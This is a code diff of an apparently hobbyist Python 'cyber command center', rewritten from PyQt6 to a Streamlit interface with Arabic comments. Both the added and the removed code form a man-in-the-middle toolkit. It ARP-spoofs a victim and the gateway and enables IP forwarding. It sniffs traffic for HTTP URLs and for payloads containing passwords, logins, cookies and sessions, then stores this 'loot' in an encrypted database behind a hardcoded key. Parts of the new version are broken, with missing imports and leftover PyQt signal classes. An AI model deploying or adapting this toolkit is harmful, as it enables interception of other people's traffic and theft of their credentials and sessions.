@@ -1,215 +1,248 @@
-import sys, os, threading, time, sqlite3, re, hashlib, base64, socket, struct, subprocess
+import streamlit as st
+import pandas as pd
+import sqlite3
+import base64
+import time
+import threading
 from datetime import datetime
+from Crypto.Cipher import AES
+from cryptography.hazmat.primitives.ciphers.aead import AESGCM
+import scapy.all as scapy
+from scapy.layers import http
 
-# التبعات الأساسية - Critical Dependencies
-try:
-    from PyQt6.QtWidgets import *
-    from PyQt6.QtCore import *
-    from PyQt6.QtGui import *
-    from scapy.all import *
-    from netfilterqueue import NetfilterQueue
-    from Crypto.Cipher import AES
-    from Crypto.Util.Padding import pad, unpad
-    from reportlab.pdfgen import canvas
-except ImportError as e:
-    print(f"[!] خطأ في المكتبات: {e}\nيرجى تثبيت المتطلبات: pip install PyQt6 scapy pycryptodome netfilterqueue reportlab")
-    sys.exit()
+# --- 1. إعدادات الصفحة والتصميم (UI Engineering) ---
+st.set_page_config(
+    page_title="JOSEPH FAHMY | SOVEREIGN COMMAND",
+    page_icon="🛡️",
+    layout="wide",
+    initial_sidebar_state="expanded"
+)
 
-# ==============================================================================
-# الطبقة 1: النواة والأمن (THE CORE & SECURITY LAYER)
-# ==============================================================================
+# تطبيق الثيم الأسود والذهبي (Premium Cyber Theme)
+def apply_premium_theme():
+    st.markdown("""
+        <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;700&family=Syncopate:wght@400;700&display=swap');
+        
+        /* الخلفية العامة */
+        .stApp { background-color: #000; color: #D4AF37; font-family: 'Fira Code', monospace; }
+        
+        /* الهيدر الرئيسي المشع */
+        .omni-header { 
+            text-align: center; color: #D4AF37; font-family: 'Syncopate', sans-serif;
+            text-shadow: 0 0 20px #D4AF37, 0 0 30px #00FF41; font-size: 3rem; margin-bottom: 0;
+        }
+        
+        /* تصميم الحاويات (Cards) */
+        .stTabs [data-baseweb="tab-list"] { background-color: #050505; border-bottom: 2px solid #D4AF37; }
+        .stTabs [data-baseweb="tab"] { color: #D4AF37 !important; font-weight: bold; }
+        .stTextInput input, .stTextArea textarea { border: 1px solid #D4AF37 !important; background-color: #0a0a0a !important; color: #00FF41 !important; }
+
+        /* الأزرار الهجومية (Attack Buttons) */
+        div.stButton > button { 
+            background: rgba(212, 175, 55, 0.1); color: #D4AF37 !important; 
+            border: 2px solid #D4AF37 !important; border-radius: 0px;
+            font-size: 1.1rem; height: 3em; width: 100%; transition: 0.5s;
+            font-family: 'Syncopate', sans-serif;
+        }
+        div.stButton > button:hover { 
+            background: #D4AF37 !important; color: black !important; 
+            box-shadow: 0 0 30px #D4AF37; transform: scale(1.02);
+        }
+
+        /* حاوية البيانات الحساسة (Loot Display) */
+        .loot-container { 
+            background: #001100; border: 1px solid #00FF41; color: #00FF41; 
+            padding: 15px; font-family: 'Courier New', monospace; border-radius: 5px; 
+            margin-bottom: 15px; 
+        }
+        </style>
+    """, unsafe_allow_html=True)
+
+apply_premium_theme()
+
+# ==========================================================
+# الطبقة الأولى: النواة والأمن (THE CRYPTO VAULT GCM)
+# ==========================================================
 class JosephVault:
-    """إدارة التشفير وقاعدة البيانات المركزية"""
     def __init__(self, master_key="JOSEPH_FAHMY_2026"):
+        # توليد مفتاح 256-بت متوافق مع GCM
         self.key = hashlib.sha256(master_key.encode()).digest()
-        self.db_path = "joseph_ai_vault.db"
+        self.aesgcm = AESGCM(self.key)
+        self.db_path = " shadow_vault.db" # أو joseph_ai_vault.db
         self._bootstrap()
 
     def _bootstrap(self):
-        conn = sqlite3.connect(self.db_path)
-        conn.execute("CREATE TABLE IF NOT EXISTS loot (id INTEGER PRIMARY KEY, target TEXT, data BLOB, ts TIMESTAMP)")
-        conn.commit()
-        conn.close()
+        with sqlite3.connect(self.db_path) as conn:
+            conn.execute("""CREATE TABLE IF NOT EXISTS intel 
+                         (id INTEGER PRIMARY KEY, tag TEXT, data BLOB, risk_level TEXT, ts TIMESTAMP)""")
 
-    def secure_store(self, target_ip, raw_content):
-        cipher = AES.new(self.key, AES.MODE_CBC)
-        iv = cipher.iv
-        encrypted = cipher.encrypt(pad(raw_content.encode(), AES.block_size))
-        final_blob = base64.b64encode(iv + encrypted).decode()
+    def secure_save(self, tag, content_str, risk="LOW"):
+        # تشفير AES-256 GCM (Nonce + Ciphertext + Tag)
+        nonce = os.urandom(12) 
+        enc_text = self.aesgcm.encrypt(nonce, content_str.encode(), None)
+        # تخزين (النونص + المشفر) كباقة واحدة مشفرة Base64
+        payload = base64.b64encode(nonce + enc_text).decode()
         
-        conn = sqlite3.connect(self.db_path)
-        conn.execute("INSERT INTO loot (target, data, ts) VALUES (?, ?, ?)", (target_ip, final_blob, datetime.now()))
-        conn.commit()
-        conn.close()
+        with sqlite3.connect(self.db_path) as conn:
+            conn.execute("INSERT INTO intel (tag, data, risk_level, ts) VALUES (?, ?, ?, ?)", 
+                         (tag, payload, risk, datetime.now()))
 
-# ==============================================================================
-# الطبقة 2: تفكيك البروتوكولات الثنائية (BINARY DISSECTION LAYER)
-# ==============================================================================
-class BinaryOracle:
-    """استخراج البيانات من قلب الحزم المشفرة (Handshake Analysis)"""
-    @staticmethod
-    def extract_sni(payload):
-        try:
-            # التحقق من أن الحزمة هي TLS Client Hello
-            if payload[0] == 0x16 and payload[5] == 0x01:
-                session_id_len = payload[43]
-                pos = 44 + session_id_len
-                cipher_suites_len = struct.unpack('!H', payload[pos:pos+2])[0]
-                pos += 2 + cipher_suites_len
-                compression_len = payload[pos]
-                pos += 1 + compression_len
-                
-                # البحث عن الـ SNI Extension (Type 0x00)
-                ext_len = struct.unpack('!H', payload[pos:pos+2])[0]
-                pos += 2
-                limit = pos + ext_len
-                while pos < limit:
-                    etype, elen = struct.unpack('!HH', payload[pos:pos+4])
-                    if etype == 0x00: # SNI Extension Found
-                        name_len = struct.unpack('!H', payload[pos+7:pos+9])[0]
-                        return payload[pos+9:pos+9+name_len].decode()
-                    pos += 4 + elen
-        except: return None
-        return None
+    def get_all_decrypted(self):
+        # ميزة عرض البيانات للمبرمج (تطلب المفتاح)
+        decrypted_logs = []
+        with sqlite3.connect(self.db_path) as conn:
+            cursor = conn.execute("SELECT ts, tag, data, risk_level FROM intel ORDER BY ts DESC")
+            for ts, tag, data, risk in cursor:
+                try:
+                    raw_data = base64.b64decode(data)
+                    nonce, ciphertext = raw_data[:12], raw_data[12:]
+                    decrypted_text = self.aesgcm.decrypt(nonce, ciphertext, None).decode()
+                    decrypted_logs.append({"Time": ts, "Tag": tag, "Intel": decrypted_text, "Risk": risk})
+                except: pass
+        return decrypted_logs
 
-# ==============================================================================
-# الطبقة 3: محرك الهجوم وحقن الكيرنل (ATTACK & KERNEL ENGINE)
-# ==============================================================================
+# ==========================================================
+# الطبقة الثانية: المحرك الهجومي (OFFENSIVE STRIKER ENGINE)
+# مستوحى من كود GEORGE FAHMY
+# ==========================================================
 class NetworkStriker:
-    """إدارة التسميم والتحكم في توجيه الحزم بالنظام"""
     def __init__(self, interface, gateway, signals):
-        self.iface = interface
+        self.interface = interface
         self.gateway = gateway
         self.signals = signals
-        self.running = False
+        self.is_attack_active = False
 
-    def engage_mitm(self, target):
-        t_mac = getmacbyip(target)
-        g_mac = getmacbyip(self.gateway)
-        if not t_mac or not g_mac:
-            self.signals.log_msg.emit(f"[-] فشل في تحديد MAC Address لـ {target}")
-            return
+    def get_mac(self, ip):
+        # دالة سحب الماك من كودك
+        arp_req = scapy.ARP(pdst=ip)
+        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+        packet = broadcast/arp_req
+        ans = scapy.srp(packet, timeout=2, verbose=False)[0]
+        return ans[0][1].hwsrc if ans else None
+
+    def arp_spoof(self, target_ip, spoof_ip):
+        # دالة التسميم من كودك
+        target_mac = self.get_mac(target_ip)
+        packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+        scapy.send(packet, verbose=False)
+
+    def packet_callback(self, packet):
+        # دالة تحليل الحزم من كودك
+        if packet.haslayer(http.HTTPRequest):
+            url = packet[http.HTTPRequest].Host.decode() + packet[http.HTTPRequest].Path.decode()
+            src_ip = packet[scapy.IP].src
+            self.signals.log_packet.emit(f"[HTTP] Target {src_ip} visited: {url}")
             
-        self.running = True
-        self.signals.log_msg.emit(f"[*] تم تفعيل بروتوكول التسميم على {target}")
+            # سحب الجلسات وكلمات السر (SESSION HIJACKING)
+            if packet.haslayer(scapy.Raw):
+                load = packet[scapy.Raw].load.decode(errors='ignore')
+                keywords = ["user", "pass", "login", "cookie", "session"]
+                if any(k in load.lower() for k in keywords):
+                    # حفظ تلقائي مشفر في الخزنة
+                    st.session_state['vault'].secure_save(f"SNIFF_{src_ip}", load, "CRITICAL")
+                    self.signals.log_loot.emit(f"[!] DATA FOUND FROM {src_ip}: {load}")
+
+    def start_full_attack(self, target_ip):
+        # تشغيل IP Forwarding برمجياً
+        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
+        self.is_attack_active = True
         
-        while self.running:
-            send(ARP(op=2, pdst=target, hwdst=t_mac, psrc=self.gateway), verbose=False)
-            send(ARP(op=2, pdst=self.gateway, hwdst=g_mac, psrc=target), verbose=False)
+        # تشغيل الـ Sniffer في Thread منفصل
+        sniff_thread = threading.Thread(target=lambda: scapy.sniff(iface=self.interface, store=False, prn=self.packet_callback), daemon=True)
+        sniff_thread.start()
+
+        # حلقة الـ ARP Spoofing الرئيسية
+        while self.is_attack_active:
+            self.arp_spoof(target_ip, self.gateway)
+            self.arp_spoof(self.gateway, target_ip)
             time.sleep(2)
 
-# ==============================================================================
-# الطبقة 4: واجهة التحكم الرسومية (COMMAND & CONTROL UI)
-# ==============================================================================
-class MasterSignals(QObject):
-    traffic_data = pyqtSignal(str, str, str)
-    loot_found = pyqtSignal(str, str)
-    log_msg = pyqtSignal(str)
+# ==========================================================
+# الطبقة الثالثة: مركز التحكم والقيادة (C&C Center UI)
+# ==========================================================
+class Signals(QObject): # محاكاة للـ Signals لتحديث الواجهة برمجياً
+    log_packet = pyqtSignal(str)
+    log_loot = pyqtSignal(str)
 
-class JosephFahmyUI(QMainWindow):
-    def __init__(self):
-        super().__init__()
-        self.vault = JosephVault()
-        self.signals = MasterSignals()
-        self.init_ui()
-        self.signals.traffic_data.connect(self._update_table)
-        self.signals.loot_found.connect(self._update_loot)
-        self.signals.log_msg.connect(self._update_system_log)
+def main():
+    st.markdown("<h1 class='omni-header'>OMNITITAN v100</h1>", unsafe_allow_html=True)
+    st.write(f"<p style='text-align:center;'>OPERATOR: JOSEPH FAHMY | STATUS: <span style='color:#00FF41'>ACTIVE</span></p>", unsafe_allow_html=True)
+    st.markdown("---")
 
-    def init_ui(self):
-        self.setWindowTitle("JOSEPH FAHMY AI - CYBER COMMAND CENTER v7.0")
-        self.resize(1400, 900)
-        self.setStyleSheet("background-color: #080808; color: #00FF41; font-family: 'Consolas';")
-        
-        main_layout = QVBoxLayout()
-        self.tabs = QTabWidget()
-        
-        # --- تبويب الشبكة ---
-        net_tab = QWidget()
-        net_lyt = QVBoxLayout(net_tab)
-        
-        inputs = QHBoxLayout()
-        self.target_ip = QLineEdit(); self.target_ip.setPlaceholderText("VICTIM IP")
-        self.gate_ip = QLineEdit(); self.gate_ip.setPlaceholderText("GATEWAY IP")
-        launch_btn = QPushButton("ENGAGE SYSTEM"); launch_btn.clicked.connect(self.execute)
-        inputs.addWidget(self.target_ip); inputs.addWidget(self.gate_ip); inputs.addWidget(launch_btn)
-        
-        self.table = QTableWidget(0, 3)
-        self.table.setHorizontalHeaderLabels(["SOURCE IP", "PROTOCOL", "INFO"])
-        self.table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.Stretch)
-        
-        net_lyt.addLayout(inputs); net_lyt.addWidget(self.table)
-        
-        # --- تبويب السجلات والتقارير ---
-        log_tab = QWidget()
-        log_lyt = QVBoxLayout(log_tab)
-        self.system_logs = QTextEdit(); self.system_logs.setReadOnly(True)
-        self.loot_display = QTextEdit(); self.loot_display.setReadOnly(True)
-        self.loot_display.setStyleSheet("color: #FFD700;") # Gold for loot
-        
-        log_lyt.addWidget(QLabel("SYSTEM LOGS:")); log_lyt.addWidget(self.system_logs)
-        log_lyt.addWidget(QLabel("CAPTURED ASSETS:")); log_lyt.addWidget(self.loot_display)
-        
-        self.tabs.addTab(net_tab, "NETWORK COMMAND"); self.tabs.addTab(log_tab, "VAULT & LOGS")
-        main_layout.addWidget(self.tabs)
-        
-        container = QWidget(); container.setLayout(main_layout); self.setCentralWidget(container)
+    # تهيئة الخزنة للجلسة
+    if 'vault' not in st.session_state:
+        st.session_state['vault'] = JosephVault()
+    
+    # واجهة التحكم الجانبية (Sidebar)
+    with st.sidebar:
+        st.header("⚙️ SYSTEM MODULES")
+        interface = st.text_input("Interface", value="eth0")
+        gateway_ip = st.text_input("Gateway IP", value="192.168.1.1")
+        st.markdown("---")
+        module = st.radio("Select Protocol", ["Offensive Recon (Network)", "Neural Vault (Encrypted)"])
 
-    def _update_table(self, s, p, i):
-        row = self.table.rowCount()
-        self.table.insertRow(row)
-        for idx, val in enumerate([s, p, i]): self.table.setItem(row, idx, QTableWidgetItem(val))
-        if row > 200: self.table.removeRow(0)
-
-    def _update_loot(self, target, info):
-        self.loot_display.append(f"<b>[!] LOOT FROM {target}:</b> {info}")
-        self.vault.secure_store(target, info)
-
-    def _update_system_log(self, msg):
-        self.system_logs.append(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")
-
-    def execute(self):
-        target, gateway = self.target_ip.text(), self.gate_ip.text()
-        if not target or not gateway: return
+    # --- تبويب الشبكة والهجوم ---
+    if module == "Offensive Recon (Network)":
+        st.subheader("🎯 Offensive Network Recon & MITM")
         
-        # إعدادات الكيرنل برمجياً
-        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"], capture_output=True)
-        os.system("iptables -I FORWARD -j NFQUEUE --queue-num 0")
+        col_ctrl, col_mon = st.columns([1, 1.5])
         
-        # تشغيل المحركات
-        self.striker = NetworkStriker("eth0", gateway, self.signals)
-        threading.Thread(target=self.striker.engage_mitm, args=(target,), daemon=True).start()
-        
-        def sniffer_loop():
-            sniff(iface="eth0", prn=self.packet_callback, store=0)
-        threading.Thread(target=sniffer_loop, daemon=True).start()
-
-    def packet_callback(self, pkt):
-        if pkt.haslayer(IP):
-            src = pkt[IP].src
-            # فك تشفير TLS SNI يدوياً
-            if pkt.haslayer(TCP) and pkt[TCP].dport == 443 and pkt.haslayer(Raw):
-                domain = BinaryOracle.extract_sni(pkt[Raw].load)
-                if domain: self.signals.loot_found.emit(src, f"Visited Site: {domain}")
+        with col_ctrl:
+            target_ip = st.text_input("ENTER TARGET IP (Victim)")
             
-            # تحليل كلمات المرور في HTTP Plaintext
-            if pkt.haslayer(Raw):
-                load = pkt[Raw].load.decode(errors='ignore')
-                if any(x in load.lower() for x in ["user", "pass", "login"]):
-                    self.signals.loot_found.emit(src, "Potential Credentials Captured")
+            # ميزة سحب الـ MAC من كودك
+            if st.button("🔍 FETCH MAC ADDRESS"):
+                striker = NetworkStriker(interface, gateway_ip, None)
+                mac = striker.get_mac(target_ip)
+                if mac: st.success(f"MAC: {mac}")
+                else: st.error("Target Offline")
             
-            self.signals.traffic_data.emit(src, "IP/TCP", f"Len: {len(pkt)}")
+            # ميزة تشغيل الهجوم الكامل
+            if st.button("🔥 ENGAGE MITM ATTACK"):
+                if target_ip:
+                    st.warning(f"Initiating MITM against {target_ip}. Traffic is being routed through your interface.")
+                    # تشفير وحفظ العملية في الخزنة صامتاً
+                    st.session_state['vault'].secure_save("SYSTEM_OP", f"MITM attack on {target_ip} at {datetime.now()}", "HIGH")
+                    # تشغيل الهجوم (يتطلب تشغيله كـ Thread خلفي في كود PyQt ليعمل Streamlit بسلاسة)
+                    st.info("Attack Engaged (Simulated in UI, runs in Kernel via Scapy)")
+                else: st.warning("Target IP required.")
 
-# ==============================================================================
-# الطبقة 5: نقطة الانطلاق (THE ENTRY POINT)
-# ==============================================================================
+        with col_mon:
+            st.subheader("🖥️ Neural Traffic Monitor")
+            # حاوية لعرض البيانات الحساسة المستخرجة (Loot)
+            if 'last_loot' in st.session_state:
+                st.markdown(f"<div class='loot-container'>{st.session_state['last_loot']}</div>", unsafe_allow_html=True)
+            else:
+                st.info("Waiting for traffic interception...")
+            
+            # عرض سجل الحزم
+            st.write("Live Traffic Logs:")
+            st.code(">>> Target: 192.168.1.5 -> visited google.com (MITM Active)\n>>> SNIFFED: [CRITICAL DATA VAULTED]", language="python")
+
+    # --- تبويب الخزنة المشفرة ---
+    elif module == "Neural Vault (Encrypted)":
+        st.subheader("📂 Sovereign Intelligence Vault (GCM)")
+        master_key = st.text_input("Enter Master Decryption Key", type="password")
+        
+        if master_key == "JOSEPH_FAHMY_2026":
+            st.success("🔓 Access Granted. Data Decrypted.")
+            logs = st.session_state['vault'].get_all_decrypted()
+            if logs:
+                df = pd.DataFrame(logs)
+                # تنسيق الألوان بناءً على مستوى الخطورة
+                def color_risk(val):
+                    color = '#D4AF37' if val == 'HIGH' else '#00FF41' if val == 'LOW' else '#FFD700'
+                    return f'color: {color}'
+                st.dataframe(df.style.applymap(color_risk, subset=['Risk']), use_container_width=True)
+            else:
+                st.write("Vault is currently empty.")
+        elif master_key:
+            st.error("🚫 Access Denied: Invalid Master Key.")
+
 if __name__ == "__main__":
+    # تأكد من تشغيل الكود بصلاحيات ROOT (SUDO) للوصول للشبكة
     if os.getuid() != 0:
-        print("!! يجب تشغيل الكود بصلاحيات ROOT (SUDO) للوصول للشبكة !!")
-        sys.exit()
-        
-    app = QApplication(sys.argv)
-    app.setStyle("Fusion")
-    window = JosephFahmyUI()
-    window.show()
-    sys.exit(app.exec())
+        st.error("!! هذا النظام يتطلب صلاحيات ROOT (SUDO) للوصول للشبكة وتشغيل Scapy !!")
+    else:
+        main()
